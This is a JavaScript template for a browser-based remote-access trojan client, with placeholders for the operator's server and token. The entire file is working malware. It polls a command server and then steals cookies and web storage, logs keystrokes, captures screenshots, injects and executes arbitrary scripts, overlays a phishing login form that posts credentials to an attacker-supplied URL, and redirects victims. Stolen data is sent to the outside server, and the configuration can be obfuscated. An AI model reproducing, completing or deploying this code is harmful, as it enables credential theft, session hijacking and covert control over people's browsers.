// Browser-based RAT Client Template
// Generated: __BUILD_TIME__
// Client ID: __CLIENT_ID__

(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        serverUrl: '__SERVER_URL__',
        authToken: '__AUTH_TOKEN__',
        clientId: '__CLIENT_ID__',
        heartbeatInterval: 10000,
        maxRetries: 3,
        retryDelay: 15000,
        stealth: false
    };

    // State
    let isRunning = true;
    let retryCount = 0;
    let lastCommandId = null;
    let communicationKey = null;

    // Browser-specific utilities
    const BrowserUtils = {
        decode: __OBFUSCATE__ ? (str) => atob(str) : (str) => str,
        generateId: () => Math.random().toString(36).substr(2, 9),
        sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
        
        async httpRequest(url, options = {}) {
            const defaultOptions = {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Client-ID': CONFIG.clientId,
                    'Authorization': `Bearer ${CONFIG.authToken}`,
                    'X-Browser-Fingerprint': this.getBrowserFingerprint()
                }
            };

            const finalOptions = { ...defaultOptions, ...options };

            try {
                const response = await fetch(url, finalOptions);
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                return await response.json();
            } catch (error) {
                throw new Error(`HTTP request failed: ${error.message}`);
            }
        },

        getBrowserFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Browser fingerprint', 2, 2);
            
            const fingerprint = [
                navigator.userAgent,
                navigator.language,
                screen.width + 'x' + screen.height,
                new Date().getTimezoneOffset(),
                canvas.toDataURL()
            ].join('|');
            
            return this.simpleHash(fingerprint);
        },

        simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return hash.toString(36);
        },

        getBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                document: {
                    title: document.title,
                    domain: document.domain,
                    referrer: document.referrer,
                    cookie: document.cookie
                },
                plugins: Array.from(navigator.plugins).map(plugin => ({
                    name: plugin.name,
                    description: plugin.description,
                    filename: plugin.filename
                })),
                mimeTypes: Array.from(navigator.mimeTypes).map(mimeType => ({
                    type: mimeType.type,
                    description: mimeType.description
                })),
                timestamp: Date.now(),
                clientId: CONFIG.clientId
            };
        },

        async captureScreenshot() {
            try {
                // Use html2canvas library if available
                if (typeof html2canvas !== 'undefined') {
                    const canvas = await html2canvas(document.body);
                    return canvas.toDataURL('image/png');
                } else {
                    // Fallback: use Screen Capture API if available
                    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                        const stream = await navigator.mediaDevices.getDisplayMedia({ 
                            video: { mediaSource: 'screen' } 
                        });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        stream.getTracks().forEach(track => track.stop());
                        return canvas.toDataURL('image/png');
                    } else {
                        throw new Error('No screenshot capability available');
                    }
                }
            } catch (error) {
                throw new Error(`Screenshot failed: ${error.message}`);
            }
        },

        async executeCommand(command, parameters = {}) {
            console.log(`[BROWSER-RAT] Executing: ${command}`);
            
            let result = null;
            let error = null;

            try {
                switch (command) {
                    case 'system_info':
                        result = BrowserUtils.getBrowserInfo();
                        break;

                    case 'ping':
                        result = { 
                            pong: Date.now(), 
                            clientId: CONFIG.clientId,
                            url: window.location.href,
                            title: document.title
                        };
                        break;

                    case 'screenshot':
                        try {
                            const screenshot = await BrowserUtils.captureScreenshot();
                            result = { 
                                status: 'screenshot_captured',
                                data: screenshot.substring(0, 100000), // Limit size
                                fullSize: screenshot.length,
                                format: 'png'
                            };
                        } catch (e) {
                            error = `Screenshot failed: ${e.message}`;
                        }
                        break;

                    case 'dom_info':
                        result = {
                            title: document.title,
                            url: window.location.href,
                            domain: document.domain,
                            forms: Array.from(document.forms).map(form => ({
                                id: form.id,
                                name: form.name,
                                action: form.action,
                                method: form.method,
                                fields: Array.from(form.elements).map(field => ({
                                    name: field.name,
                                    type: field.type,
                                    id: field.id,
                                    value: field.type === 'password' ? '[HIDDEN]' : field.value
                                }))
                            })),
                            links: Array.from(document.links).slice(0, 50).map(link => ({
                                href: link.href,
                                text: link.textContent.substring(0, 100),
                                target: link.target
                            })),
                            cookies: document.cookie.split(';').map(cookie => cookie.trim()),
                            localStorage: Object.keys(localStorage).slice(0, 20),
                            sessionStorage: Object.keys(sessionStorage).slice(0, 20)
                        };
                        break;

                    case 'extract_forms':
                        result = {
                            forms: Array.from(document.forms).map(form => ({
                                id: form.id || form.name || `form_${Math.random().toString(36).substr(2, 9)}`,
                                action: form.action,
                                method: form.method,
                                fields: Array.from(form.elements).map(field => ({
                                    name: field.name,
                                    type: field.type,
                                    id: field.id,
                                    className: field.className,
                                    placeholder: field.placeholder,
                                    required: field.required,
                                    value: field.type === 'password' ? '[HIDDEN]' : field.value
                                }))
                            }))
                        };
                        break;

                    case 'extract_cookies':
                        result = {
                            cookies: document.cookie.split(';').map(cookie => {
                                const [name, value] = cookie.trim().split('=');
                                return { name, value };
                            }),
                            localStorage: Object.keys(localStorage).map(key => ({
                                key: key,
                                value: localStorage[key].substring(0, 500)
                            })),
                            sessionStorage: Object.keys(sessionStorage).map(key => ({
                                key: key,
                                value: sessionStorage[key].substring(0, 500)
                            }))
                        };
                        break;

                    case 'inject_script':
                        if (parameters.code) {
                            try {
                                const script = document.createElement('script');
                                script.textContent = parameters.code;
                                document.head.appendChild(script);
                                
                                // Wait a bit for script to execute
                                await BrowserUtils.sleep(1000);
                                
                                result = { 
                                    status: 'script_injected',
                                    code: parameters.code.substring(0, 200)
                                };
                            } catch (e) {
                                error = `Script injection failed: ${e.message}`;
                            }
                        } else {
                            error = 'No code provided';
                        }
                        break;

                    case 'modify_dom':
                        if (parameters.selector && parameters.action) {
                            try {
                                const elements = document.querySelectorAll(parameters.selector);
                                const results = [];
                                
                                elements.forEach((element, index) => {
                                    switch (parameters.action) {
                                        case 'remove':
                                            element.remove();
                                            results.push({ index, action: 'removed' });
                                            break;
                                        case 'hide':
                                            element.style.display = 'none';
                                            results.push({ index, action: 'hidden' });
                                            break;
                                        case 'show':
                                            element.style.display = '';
                                            results.push({ index, action: 'shown' });
                                            break;
                                        case 'text':
                                            if (parameters.text) {
                                                element.textContent = parameters.text;
                                                results.push({ index, action: 'text_changed', text: parameters.text });
                                            }
                                            break;
                                        case 'html':
                                            if (parameters.html) {
                                                element.innerHTML = parameters.html;
                                                results.push({ index, action: 'html_changed', html: parameters.html.substring(0, 100) });
                                            }
                                            break;
                                        case 'attribute':
                                            if (parameters.attribute && parameters.value !== undefined) {
                                                element.setAttribute(parameters.attribute, parameters.value);
                                                results.push({ index, action: 'attribute_set', attribute: parameters.attribute, value: parameters.value });
                                            }
                                            break;
                                    }
                                });
                                
                                result = { 
                                    status: 'dom_modified',
                                    selector: parameters.selector,
                                    action: parameters.action,
                                    results: results
                                };
                            } catch (e) {
                                error = `DOM modification failed: ${e.message}`;
                            }
                        } else {
                            error = 'Missing selector or action';
                        }
                        break;

                    case 'keylogger_start':
                        if (!window.keyloggerActive) {
                            window.keyloggerActive = true;
                            window.keyloggerData = [];
                            
                            const handleKeyPress = (e) => {
                                window.keyloggerData.push({
                                    key: e.key,
                                    code: e.code,
                                    timestamp: Date.now(),
                                    target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
                                    type: e.type
                                });
                            };
                            
                            document.addEventListener('keydown', handleKeyPress);
                            document.addEventListener('keypress', handleKeyPress);
                            document.addEventListener('keyup', handleKeyPress);
                            
                            result = { status: 'keylogger_started' };
                        } else {
                            error = 'Keylogger already active';
                        }
                        break;

                    case 'keylogger_stop':
                        if (window.keyloggerActive) {
                            window.keyloggerActive = false;
                            result = { 
                                status: 'keylogger_stopped',
                                data: window.keyloggerData || []
                            };
                            window.keyloggerData = [];
                        } else {
                            error = 'Keylogger not active';
                        }
                        break;

                    case 'keylogger_data':
                        result = { 
                            status: 'keylogger_data',
                            data: window.keyloggerData || []
                        };
                        break;

                    case 'phishing_inject':
                        if (parameters.url && parameters.formSelector) {
                            try {
                                // Create fake form
                                const form = document.createElement('form');
                                form.method = 'POST';
                                form.action = parameters.url;
                                form.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;display:flex;align-items:center;justify-content:center;';
                                
                                form.innerHTML = `
                                    <div style="background:white;padding:20px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);max-width:400px;width:90%;">
                                        <h3>${parameters.title || 'Login Required'}</h3>
                                        <p>${parameters.message || 'Please enter your credentials'}</p>
                                        <input type="text" name="username" placeholder="Username" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:5px;">
                                        <input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:5px;">
                                        <button type="submit" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;">Submit</button>
                                        <button type="button" onclick="this.parentElement.parentElement.remove()" style="width:100%;padding:10px;margin-top:5px;background:#6c757d;color:white;border:none;border-radius:5px;cursor:pointer;">Cancel</button>
                                    </div>
                                `;
                                
                                document.body.appendChild(form);
                                
                                result = { status: 'phishing_form_injected' };
                            } catch (e) {
                                error = `Phishing injection failed: ${e.message}`;
                            }
                        } else {
                            error = 'Missing url or formSelector';
                        }
                        break;

                    case 'redirect':
                        if (parameters.url) {
                            window.location.href = parameters.url;
                            result = { status: 'redirecting', url: parameters.url };
                        } else {
                            error = 'No URL provided';
                        }
                        break;

                    case 'custom_script':
                        if (parameters.code) {
                            try {
                                const func = new Function('params', 'BrowserUtils', parameters.code);
                                result = func(parameters, BrowserUtils);
                            } catch (e) {
                                error = `Script execution failed: ${e.message}`;
                            }
                        } else {
                            error = 'No code provided';
                        }
                        break;

                    case 'shutdown':
                        result = { status: 'shutting_down' };
                        isRunning = false;
                        break;

                    default:
                        error = `Unknown command: ${command}`;
                }
            } catch (e) {
                error = `Command execution failed: ${e.message}`;
            }

            return { result, error, commandId: lastCommandId };
        },

        async sendResponse(responseData) {
            try {
                const response = await BrowserUtils.httpRequest(
                    `${CONFIG.serverUrl}/.netlify/functions/response`,
                    {
                        method: 'POST',
                        body: JSON.stringify(responseData)
                    }
                );
                console.log('[BROWSER-RAT] Response sent successfully');
                return response;
            } catch (error) {
                console.error('[BROWSER-RAT] Failed to send response:', error.message);
                throw error;
            }
        },

        async heartbeat() {
            try {
                const response = await BrowserUtils.httpRequest(
                    `${CONFIG.serverUrl}/.netlify/functions/heartbeat`
                );

                if (response.status === 'command_pending') {
                    console.log('[BROWSER-RAT] Received command:', response.command);
                    lastCommandId = response.command.id;
                    
                    const result = await BrowserUtils.executeCommand(
                        response.command.command, 
                        response.command.parameters
                    );
                    
                    await BrowserUtils.sendResponse(result);
                } else {
                    console.log('[BROWSER-RAT] Heartbeat acknowledged');
                }

                retryCount = 0;
                return response;
            } catch (error) {
                console.error('[BROWSER-RAT] Heartbeat failed:', error.message);
                retryCount++;
                
                if (retryCount >= CONFIG.maxRetries) {
                    console.error('[BROWSER-RAT] Max retries reached, stopping');
                    isRunning = false;
                }
                
                throw error;
            }
        }
    };

    // Persistence hook
    // __PERSISTENCE_HOOK__

    // Main execution loop
    async function start() {
        console.log(`[BROWSER-RAT] Client starting...`);
        console.log(`[BROWSER-RAT] Client ID: ${CONFIG.clientId}`);
        console.log(`[BROWSER-RAT] Server: ${CONFIG.serverUrl}`);
        console.log(`[BROWSER-RAT] URL: ${window.location.href}`);
        
        // Decode configuration if obfuscated
        if (__OBFUSCATE__) {
            CONFIG.serverUrl = BrowserUtils.decode(CONFIG.serverUrl);
            CONFIG.authToken = BrowserUtils.decode(CONFIG.authToken);
        }

        while (isRunning) {
            try {
                await BrowserUtils.heartbeat();
                await BrowserUtils.sleep(CONFIG.heartbeatInterval);
            } catch (error) {
                console.error('[BROWSER-RAT] Main loop error:', error.message);
                await BrowserUtils.sleep(CONFIG.retryDelay);
            }
        }

        console.log('[BROWSER-RAT] Client stopped');
    }

    // Error handling
    window.addEventListener('error', (e) => {
        console.error('[BROWSER-RAT] Error:', e.error);
    });

    window.addEventListener('unhandledrejection', (e) => {
        console.error('[BROWSER-RAT] Unhandled promise rejection:', e.reason);
    });

    // Page visibility handling
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            console.log('[BROWSER-RAT] Page hidden, reducing activity');
        } else {
            console.log('[BROWSER-RAT] Page visible, resuming activity');
        }
    });

    // Start the client
    start();
})();
